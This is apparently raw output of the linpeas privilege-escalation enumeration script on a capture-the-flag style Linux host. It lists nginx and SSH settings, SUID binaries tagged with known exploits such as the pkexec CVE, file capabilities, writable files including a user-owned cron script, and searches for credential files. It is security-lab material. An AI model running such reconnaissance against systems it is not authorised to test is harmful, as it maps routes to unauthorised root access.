lrwxrwxrwx 1 root root 56 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-dav-ext.conf -> /usr/share/nginx/modules-available/mod-http-dav-ext.conf
load_module modules/ngx_http_dav_ext_module.so;
lrwxrwxrwx 1 root root 50 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
lrwxrwxrwx 1 root root 62 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-upstream-fair.conf -> /usr/share/nginx/modules-available/mod-http-upstream-fair.conf
load_module modules/ngx_http_upstream_fair_module.so;
lrwxrwxrwx 1 root root 48 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 53 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-echo.conf -> /usr/share/nginx/modules-available/mod-http-echo.conf
load_module modules/ngx_http_echo_module.so;
lrwxrwxrwx 1 root root 60 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-subs-filter.conf -> /usr/share/nginx/modules-available/mod-http-subs-filter.conf
load_module modules/ngx_http_subs_filter_module.so;
lrwxrwxrwx 1 root root 54 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-geoip.conf -> /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
-rw-r--r-- 1 root root 422 Apr  5  2018 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+\.php)(/.+)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
-rw-r--r-- 1 root root 217 Apr  5  2018 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 1482 Apr  5  2018 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

drwxr-xr-x 3 root root 4096 Jun 14  2020 /usr/lib/nginx

drwxr-xr-x 2 root root 4096 Jun 14  2020 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Jun 14  2020 /usr/share/nginx
-rw-r--r-- 1 root root 52 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 42 Aug 18  2019 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 40 Aug 18  2019 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 54 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-upstream-fair.conf
load_module modules/ngx_http_upstream_fair_module.so;
-rw-r--r-- 1 root root 49 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-auth-pam.conf
load_module modules/ngx_http_auth_pam_module.so;
-rw-r--r-- 1 root root 48 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-dav-ext.conf
load_module modules/ngx_http_dav_ext_module.so;
-rw-r--r-- 1 root root 45 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-echo.conf
load_module modules/ngx_http_echo_module.so;
-rw-r--r-- 1 root root 52 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-subs-filter.conf
load_module modules/ngx_http_subs_filter_module.so;
-rw-r--r-- 1 root root 46 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
-rw-r--r-- 1 root root 53 Aug 18  2019 /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;

drwxr-xr-x 7 root root 4096 Jun 14  2020 /var/lib/nginx
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied

drwxr-xr-x 2 root adm 4096 Nov  6 20:32 /var/log/nginx


╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1007 Apr  5  2018 /etc/nginx/fastcgi_params                                                                                                                                                                          

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 13  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 26  2018 /etc/NetworkManager/system-connections                                                                                                                                                             
drwxr-xr-x 2 root root 4096 Mar 26  2018 /etc/NetworkManager/system-connections


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Jun 14  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
Port 6498                                                                                                                                                                                                                                   
PermitRootLogin no
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                                                                                                                                                  
/etc/pki/fwupd-metadata/LVFS-CA.pem
1485PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                                                                              
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 14  2020 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd


╔══════════╣ Passwords inside pam.d
/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin                                                                                                                                                     



╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 14  2020 /usr/share/keyrings                                                                                                                                                                                




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 345 Jun 14  2020 /etc/apt/trusted.gpg.d/nginx_ubuntu_stable.gpg
-rw-r--r-- 1 root root 360 Jun 14  2020 /etc/apt/trusted.gpg.d/ondrej_ubuntu_apache2.gpg
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 21  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 boring boring 4096 Nov  6 21:18 /home/boring/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  1  2018 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  1  2018 /usr/share/bash-completion/completions/bind                                                                                                                                                         
-rw-r--r-- 1 root root 856 Apr  1  2018 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 www-data adm 178088 Nov  6 20:32 /var/log/nginx/access.log                                                                                                                                                                     

-rw-r----- 1 www-data adm 0 Nov  6 20:32 /var/log/nginx/error.log

╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                                                                            

























-rw-r--r-- 1 root root 516413 Feb 10  2018 /usr/share/gutenprint/5.2/xml/printers.xml























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 boring boring 3130 Jun 15  2020 /home/boring/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 boring boring 807 Jun 14  2020 /home/boring/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
strings Not Found                                                                                                                                                                                                                           
-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                   
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root dip 374K Feb 11  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent                                                                                                                                                                                  
-rwxr-sr-x 1 root crontab 39K Nov 15  2017 /usr/bin/crontab
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root tty 31K Mar  5  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                                                                                    
/etc/ld.so.conf                                                                                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root 10625 Jun 18  2019 usr.bin.evince
-rw-r--r-- 1 root root  8493 Jun  3  2020 usr.bin.firefox
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root  5552 Apr 24  2020 usr.sbin.cupsd
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                                                                     
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/bin/gettext.sh                                                                                                                                                                                                                         
/usr/bin/amuFormat.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2020-06-14+22:43:16.8909696910 /var/www/.mysecretcronjob.sh                                                                                                                                                                                 
2020-06-14+14:36:36.1317539560 /etc/console-setup/cached_setup_terminal.sh
2020-06-14+14:36:36.1317539560 /etc/console-setup/cached_setup_font.sh
2020-06-14+14:36:36.1277539910 /etc/console-setup/cached_setup_keyboard.sh

╔══════════╣ Unexpected in root
/swapfile                                                                                                                                                                                                                                   
/initrd.img
/vmlinuz.old
/vmlinuz
/initrd.img.old

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                                                           
total 36                                                                                                                                                                                                                                    
drwxr-xr-x   2 root root  4096 Jun 14  2020 .
drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
-rw-r--r--   1 root root    96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root   664 Apr  1  2018 bash_completion.sh
-rw-r--r--   1 root root  1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root   652 Feb 13  2018 input-method-config.sh
-rw-r--r--   1 root root  1941 Apr 10  2018 vte-2.91.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/root/
/var/www
/var/www/html
/var/www/html/n0th1ng3ls3m4tt3r
/var/www/html/n0th1ng3ls3m4tt3r/index.html
/var/www/html/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
/var/www/html/web0
/var/www/html/web0/robots.txt
/var/www/html/web0/index.html
/var/www/html/web0/hidden
/var/www/html/web0/hidden/index.html
/var/www/html/web0/hidden/whatever
/var/www/html/web0/hidden/whatever/index.html
/var/www/html/robots.txt
/var/www/html/index.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service                                                                                                                                                                         
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                                                            
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/journal/1ed81d5ac22b46c4975417b057b1933e/user-1000.journal                                                                                                                                                                         
/var/log/journal/1ed81d5ac22b46c4975417b057b1933e/system.journal
/var/log/syslog
/var/log/kern.log
/var/log/auth.log
/home/boring/.gnupg/trustdb.gpg
/home/boring/.gnupg/pubring.kbx

logrotate 3.11.0

╔══════════╣ Files inside /home/boring (limit 20)
total 40                                                                                                                                                                                                                                    
drwxr-xr-x 5 boring boring 4096 Jun 15  2020 .
drwxr-xr-x 3 root   root   4096 Jun 14  2020 ..
-rw------- 1 boring boring    2 Nov  6 21:09 .bash_history
-rw-r--r-- 1 boring boring  220 Jun 14  2020 .bash_logout
-rw-r--r-- 1 boring boring 3130 Jun 15  2020 .bashrc
drwx------ 2 boring boring 4096 Jun 14  2020 .cache
drwx------ 3 boring boring 4096 Nov  6 21:18 .gnupg
drwxrwxr-x 3 boring boring 4096 Jun 14  2020 .local
-rw-r--r-- 1 boring boring  807 Jun 14  2020 .profile
-rw-r--r-- 1 boring boring   83 Jun 14  2020 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/n0th1ng3ls3m4tt3r/index.html                                                                                                                                                                                                  
/var/www/html/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
/var/www/html/web0/robots.txt
/var/www/html/web0/index.html
/var/www/html/web0/hidden/index.html
/var/www/html/web0/hidden/whatever/index.html
/var/www/html/robots.txt
/var/www/html/index.html
/var/www/.mysecretcronjob.sh

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 974 Mar 16  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-auto.page                                                                                                                                   
-rw-r--r-- 1 root root 755 Mar 16  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-first.page
-rw-r--r-- 1 root root 974 Mar 16  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-auto.page
-rw-r--r-- 1 root root 755 Mar 16  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-first.page
-rw-r--r-- 1 root root 2543 Apr 13  2018 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 76 Mar 21  2018 /usr/share/lightdm/lightdm.conf.d/50-disable-log-backup.conf
-rw-r--r-- 1 root root 11854 Jun 14  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 291 Mar  4  2015 /usr/share/themes/Breeze-ob/openbox-3/desk_pressed.xbm.old
-rw-r--r-- 1 root root 291 Mar  4  2015 /usr/share/themes/Breeze-ob/openbox-3/desk_hover.xbm.old
-rw-r--r-- 1 root root 273 Mar  4  2015 /usr/share/themes/Breeze-ob/openbox-3/desk.xbm.old
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  1  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 0 Jun  4  2020 /usr/src/linux-headers-4.15.0-106-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jun  4  2020 /usr/src/linux-headers-4.15.0-106-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217484 Jun  4  2020 /usr/src/linux-headers-4.15.0-106-generic/.config.old
-rw-r--r-- 1 root root 0 Apr 23  2018 /usr/src/linux-headers-4.15.0-20-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Apr 23  2018 /usr/src/linux-headers-4.15.0-20-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 216818 Apr 23  2018 /usr/src/linux-headers-4.15.0-20-generic/.config.old
-rw-r--r-- 1 root root 24688 Jun 13  2020 /var/log/Xorg.0.log.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission                                                                                                                                                                         
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3022000

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 16K
drwxr-xr-x  3 root   root   4.0K Jun 15  2020 .
drwxr-xr-x 14 root   root   4.0K Jun 13  2020 ..
drwxr-xr-x  4 root   root   4.0K Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh

/var/www/html:
total 32K
drwxr-xr-x 4 root root 4.0K Jun 15  2020 .

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 211 Apr 17  2018 /usr/share/gnumeric/1.12.35/autoformat-templates/Classical/.category                                                                                                                                
-rw-r--r-- 1 root root 211 Apr 17  2018 /usr/share/gnumeric/1.12.35/autoformat-templates/Colourful/.category
-rw-r--r-- 1 root root 201 Apr 17  2018 /usr/share/gnumeric/1.12.35/autoformat-templates/List/.category
-rw-r--r-- 1 root root 207 Apr 17  2018 /usr/share/gnumeric/1.12.35/autoformat-templates/General/.category
-rw-r--r-- 1 root root 197 Apr 17  2018 /usr/share/gnumeric/1.12.35/autoformat-templates/3D/.category
-rw-r--r-- 1 root root 211 Apr 17  2018 /usr/share/gnumeric/1.12.35/autoformat-templates/Financial/.category
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw------- 1 root root 0 Apr 26  2018 /etc/.pwd.lock
-rw-r--r-- 1 root root 1531 Jun 14  2020 /etc/apparmor.d/cache/.features
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
-rw-r--r-- 1 boring boring 220 Jun 14  2020 /home/boring/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 988 Jun 14  2020 /var/backups/apt.extended_states.1.gz                                                                                                                                                               
-rw-r--r-- 1 root root 43 Jun 13  2020 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 367015 Jun 13  2020 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 2910 Jun 15  2020 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 2980 Jun 13  2020 /var/backups/alternatives.tar.3.gz
-rw-r--r-- 1 root root 280 Jun 13  2020 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 11 Jun 13  2020 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 228 Apr 26  2018 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 43 Jun 13  2020 /var/backups/dpkg.arch.2.gz
-rw-r--r-- 1 root root 1369421 Jun 15  2020 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 51200 Nov  6 20:32 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 160 Jun 13  2020 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 366599 Jun 13  2020 /var/backups/dpkg.status.3.gz
-rw-r--r-- 1 root root 179 Apr 26  2018 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 934 Jun 13  2020 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 160 Jun 13  2020 /var/backups/dpkg.diversions.3.gz
-rw-r--r-- 1 root root 179 Apr 26  2018 /var/backups/dpkg.statoverride.3.gz
-rw-r--r-- 1 root root 160 Jun 13  2020 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 2892 Jun 14  2020 /var/backups/alternatives.tar.2.gz
-rw-r--r-- 1 root root 179 Apr 26  2018 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 8986 Jun 15  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 377621 Jun 14  2020 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 43 Jun 13  2020 /var/backups/dpkg.arch.3.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/dev/shm/linpeas.sh
/home/boring
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/crash
/var/lib/lightdm-data/kral4
/var/metrics
/var/tmp
/var/www/.mysecretcronjob.sh

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
  Group boring:                                                                                                                                                                                                                             
/dev/shm/linpeas.sh                                                                                                                                                                                                                         

╔══════════╣ Searching passwords in history files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/pppd/2.4.7/passwordfd.so
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
/usr/share/doc/dialog/examples/password
/usr/share/doc/dialog/examples/password1
/usr/share/doc/dialog/examples/password2
/usr/share/help/bg/evince/password.page
/usr/share/help/ca/evince/password.page
/usr/share/help/ca/file-roller/password-protection.page
/usr/share/help/ca/file-roller/troubleshooting-password.page
/usr/share/help/C/evince/password.page
/usr/share/help/C/file-roller/password-protection.page
/usr/share/help/C/file-roller/troubleshooting-password.page
/usr/share/help/cs/evince/password.page
/usr/share/help/cs/file-roller/password-protection.page
/usr/share/help/cs/file-roller/troubleshooting-password.page
/usr/share/help/da/evince/password.page
/usr/share/help/da/file-roller/password-protection.page
/usr/share/help/da/file-roller/troubleshooting-password.page
/usr/share/help/de/evince/password.page
/usr/share/help/de/file-roller/password-protection.page
/usr/share/help/de/file-roller/troubleshooting-password.page
/usr/share/help/el/evince/password.page
/usr/share/help/el/file-roller/password-protection.page
/usr/share/help/el/file-roller/troubleshooting-password.page
/usr/share/help/en_GB/evince/password.page
/usr/share/help/es/evince/password.page
/usr/share/help/es/file-roller/password-protection.page
/usr/share/help/es/file-roller/troubleshooting-password.page
